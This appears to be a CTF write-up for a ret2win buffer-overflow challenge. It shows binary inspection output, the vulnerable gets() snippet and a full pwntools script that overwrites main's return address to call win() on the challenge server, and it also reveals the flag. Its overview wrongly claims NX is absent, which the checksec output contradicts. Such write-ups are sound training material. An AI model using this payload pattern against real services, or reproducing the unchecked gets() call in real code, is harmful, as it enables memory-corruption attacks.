# Ret2Win Challenge Writeup

## Challenge Overview

This challenge is a classic **buffer overflow** exploitation task. The provided binary contains a vulnerable C program that:

- Uses an unsafe `gets()` call to read user input into a fixed-size buffer.
- Contains a hidden `win()` function that is never called , which reads and prints the flag from `flag.txt`.
- Does not implement modern stack protections like ASLR or NX 

## starting with basics
- `─$ file out`                
`out: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e2a70c62f87129030b477ca4d736d78ce50a111b, for GNU/Linux 3.2.0, not stripped
`
- `─$ checksec --file=out`    
`[*] '/home/salsabila/Desktop/ingehack/pwn/ret2win/out'`  
    `Arch:       amd64-64-little`  
    `RELRO:      Partial RELRO`  
    `Stack:      No canary found`  
    `NX:         NX enabled`  
    `PIE:        No PIE (0x400000)`  
    `SHSTK:      Enabled`  
    `IBT:        Enabled`  
    `Stripped:   No`  

## Vulnerable Code Snippet
- The user input length can exceed the buffer size 
```
{...
char buffer[0x100]; // 256-byte buffer
...
gets(buffer); // Unsafe: no bounds checking
...}
```
## Exploitation Strategy
- The goal is to overflow the buffer and overwrite the return address of `main()` to redirect execution to the `win()` function, which will print the flag.
- Buffer size: 256 bytes
- Saved base pointer (RBP) size: 8 bytes
- Address of `win()` function: `0x40123d`  
` └─$ readelf out -a | grep win`  
  `No processor specific unwind information to decode
    33: 000000000040123d   133 FUNC    GLOBAL DEFAULT   15 win`

## Final exploit : 
```
from pwn import *
# flag = 'ingehack{it_all_started_like_this}'
host = 'ret2win.ctf.ingeniums.club'
port = 1337
p = remote(host, port, ssl=True)

p.recvuntil(b'got> ')
offset = 256+8
payload=b"A"*offset + p64(0x000000000040123d)
p.sendline(payload)
p.recvuntil(b'')
p.interactive() ```

